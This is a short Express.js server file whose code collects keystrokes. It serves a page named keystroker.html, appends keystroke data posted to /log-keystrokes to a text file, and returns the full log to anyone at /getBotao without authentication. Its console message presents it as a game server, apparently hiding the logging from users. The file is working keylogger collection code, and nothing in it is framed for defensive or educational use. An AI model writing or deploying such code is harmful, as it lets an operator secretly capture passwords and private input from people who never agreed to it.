// server.js - Main Express server file
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 4000;

// Serve static files from the public directory
app.use(express.static('public'));
app.use(express.json());

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', './keystroker.html'));
});

// Route to handle keystroke data
app.post('/log-keystrokes', (req, res) => {
  const { keystrokes } = req.body;
  
  if (!keystrokes) {
    return res.status(400).json({ error: 'No keystroke data provided' });
  }
  
  // Append the keystrokes to a text file with timestamp
  const timestamp = new Date().toISOString();
  const logEntry = ` ${keystrokes}\n`;
  
  fs.appendFile(path.join(__dirname, 'keystrokes.txt'), logEntry, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).json({ error: 'Failed to save keystrokes' });
    }
    
    res.json({ success: true });
  });
});

app.get('/getBotao', (req, res) => {
  fs.readFile(path.join(__dirname, 'keystrokes.txt'), 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).json({ error: 'Failed to read keystrokes' });
    }
    
    res.json({ keystrokes: data });
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Game server running at http://localhost:${port}`);
});